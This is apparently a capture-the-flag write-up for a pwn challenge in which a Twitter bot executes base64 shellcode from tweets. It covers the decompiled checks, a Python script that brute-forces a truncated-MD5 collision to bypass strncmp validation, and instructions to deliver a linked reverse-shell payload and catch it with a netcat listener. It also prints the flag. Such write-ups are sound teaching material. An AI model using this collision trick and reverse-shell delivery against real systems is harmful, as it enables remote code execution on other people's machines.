# dont@me Writeup by Srdnlen
### Category: PWN. Solves: 2
### Description:
WORKING AGAIN. If you have any trouble, please contact admins on discord (awg). Same binary as before. Twitter api gets weird with tweets longer than 140 characters, so try to keep them shorter. (@name doesn't add to length) Also twitter api can be somewhat slow. Give it at least 10 min before giving up. Also don't use a private account, that just wont work.

tweet @JohnSmi31885382


### Writeup
We need to do a pwn challenge through a twitter bot. Interesting. Let's take a look at the program with a decompiler. This is my reverse with IDA.

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  printf("Poop.", argv, envp);
  if ( argc <= 1 )                              // argc needs to be > 1
    return -1;
  message_rax = grab_message((char *)argv[1]);  // gets word after @name (found this with the debugger)
  message = message_rax;
  shellcode_len = 0LL;
  message_len = strlen(message_rax);
  shellcode = (char *)base64_decode((__int64)message, message_len, &shellcode_len);// it must be base64
  if ( !shellcode )
    return -1;
  do_md5(shellcode, shellcode_len, (char *)shellcode_md5);// after decoding, turn it into md5. Remeber that it is not a string, it is a big int
  if ( !(unsigned int)validate_hash((const char *)shellcode_md5) )// validate_hash should return true
    return -1;
  v9 = shellcode;
  ((void (*)(void))shellcode)();                // run it as shellcode
  return 0;
}
```


What we can tell from the main is that our tweet should be like this: `@JohnSmi31885382 ${SHELLCODE}`

The program takes our shellcode and executes it. Seems pretty straightforward. However, we see that it calculates the md5 hash of our shellcode and does something with it. Ouch. Let's look at `validate_hash`.


```C
__int64 __fastcall validate_hash(const char *a1)
{
  //~SNIP~
  for ( index = 0; index <= 0; ++index )        // what the fuck
  {
    hash_shellcode((__int64)&s2, index);        // i will always be 0
    if ( !strncmp(a1, &s2, 16uLL) )             // if equal
      return 1LL;
  }
  return 0LL;
}
```

```C
unsigned __int64 __fastcall hash_shellcode(__int64 output, int index)
{
  //~SNIP~

  outputa = (char *)output;
  v6 = index;
  v2 = strlen((&valid_shellcodes)[index]);
  v9 = v2 >> 1;
  v10 = (&valid_shellcodes)[index];             // index will always be 0
  LODWORD(v2) = v2 >> 1;
  v11 = (int)v2 - 1LL;
  v3 = alloca(16 * (((int)v2 + 15LL) / 0x10uLL));
  input = (char *)&v5;
  for ( i = 0; i < v9; ++i )
  {
    __isoc99_sscanf(v10, "%2hhx", &input[i]); //Reads bytes from a hex string
    v10 += 2;
  }
  do_md5(input, v9, outputa);
  return __readfsqword(0x28u) ^ v13;
}
```

It gets the first hex string at `valid_shellcodes` and turns it into raw bytes. Then, it computes its MD5 and uses strncmp to compare it to the MD5 of our shellcode. 
Let's look at the MD5 of the first `valid_shellcode`...

```
printf "b801000000bf01000000488d3508000000ba0c0000000f05c348656c316f207730724c642e00" | xxd -r -p - | md5sum
79fc008108a92bcd7edb7cb63ea714b3
```

The third byte is NULL. strncmp is supposed to deal with C strings... that means it does not look at any of the bytes beyond \x00. If we provide a shellcode which has `79fc00` as the first 3 bytes of its MD5, strncmp will think it's the same MD5 as `valid_shellcode`. How can we do that? We can just add random bytes to the shellcode until the hash is good. As long as the actual instruction bytes are executed, it's ok to have garbage at the end. Here's a VERY dirty code to do it.


```Python
from hashlib import md5
import base64

valid_shells_md5 = ['79fc008108a92bcd7edb7cb63ea714b3']
valid_shell_stub = '79fc00'

shellcode = b'<INSERT SHELLCODE TO USE>'
garbage = b'aaaaaaaa'

while True:
    garbage = bytes(md5(garbage).hexdigest().encode('ascii'))

    x = md5(shellcode+garbage).hexdigest()
    #print(x)
    if (x[:6] == valid_shell_stub):
        print(shellcode+garbage)
        print(bytes(shellcode+garbage))
        print(base64.b64encode(bytes(shellcode+garbage)))
        print(x)
        exit()
```

Now, we have to think about which shellcode to use. At first I thought the bot would send you the STDOUT output to your Twitter, but I was wrong... I waited half an hour and nothing happened. We need to make a reverse shell. I used this one: http://shell-storm.org/shellcode/files/shellcode-907.php

Remember to set the IP variable to your public IP. Feed the shellcode to the collision script.
Open the port 4444 through your router's configuration and start listening: `nc -lvp 4444`.
Now, tweet at @JohnSmi31885382 with the base64'd, collision'd shellcode and you should get a connection to your netcat. Type ls to verify the shell.


## Flag
`WPI{b10kd_@nD_r33p0rtEd}`
